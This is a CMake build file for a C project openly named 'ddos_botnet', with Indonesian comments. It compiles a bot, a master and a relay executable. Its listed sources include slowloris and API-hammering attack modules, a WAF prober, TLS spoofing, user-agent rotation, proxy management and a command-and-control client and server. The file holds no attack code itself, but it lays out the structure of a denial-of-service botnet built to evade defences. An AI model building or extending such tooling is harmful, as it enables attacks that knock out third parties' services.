cmake_minimum_required(VERSION 3.15)
project(ddos_botnet C)

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)

add_compile_options(-Wall -Wextra -pthread -Wno-error=implicit-function-declaration -Wno-error=incompatible-pointer-types)

include_directories(
    include
    src/core
)

# Temukan dependensi eksternal (OpenSSL, cURL, protobuf-c)
find_package(OpenSSL REQUIRED)
find_package(CURL REQUIRED)

find_package(PkgConfig REQUIRED)
pkg_check_modules(PROTOBUF_C REQUIRED libprotobuf-c)
include_directories(${PROTOBUF_C_INCLUDE_DIRS})

# Daftar file sumber berdasarkan modul
set(AI_SOURCES
    src/ai/kill_switch.c
    src/ai/threshold_monitor.c
    src/ai/waf_prober.c
)

set(ATTACK_SOURCES
    src/attack/api_hammer.c
    src/attack/human_mimicry.c
    src/attack/payload_gen.c
    src/attack/slowloris.c
)

set(CORE_SOURCES
    src/core/c2_client.c
    src/core/c2_server.c
    src/core/heartbeat.c
    src/core/protocol.pb-c.c
    src/core/protocol_wrapper.c
)

set(ENGINE_SOURCES
    src/engine/http_engine.c
    src/engine/tls_spoof.c
    src/engine/ua_rotator.c
)

set(NETWORK_SOURCES
    src/network/geo_locator.c
    src/network/proxy_manager.c
    src/network/resolver.c
)

set(UTILS_SOURCES
    src/utils/crypto_utils.c
    src/utils/logger.c
    src/utils/metrics.c
)

set(ALL_SOURCES
    src/main.c
    ${AI_SOURCES}
    ${ATTACK_SOURCES}
    ${CORE_SOURCES}
    ${ENGINE_SOURCES}
    ${NETWORK_SOURCES}
    ${UTILS_SOURCES}
)

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}/build)

add_executable(ddos-bot    ${ALL_SOURCES})
add_executable(ddos-master ${ALL_SOURCES})
add_executable(ddos-relay  ${ALL_SOURCES})

foreach(TARGET_NAME ddos-bot ddos-master ddos-relay)
    target_link_libraries(${TARGET_NAME}
        PRIVATE
            OpenSSL::SSL
            OpenSSL::Crypto
            CURL::libcurl
            ${PROTOBUF_C_LIBRARIES}
            m
            pthread
    )
endforeach()

include_directories(
    include
    src/core
    src/include
    src/include/engine
    src/include/attack
    src/include/core
)
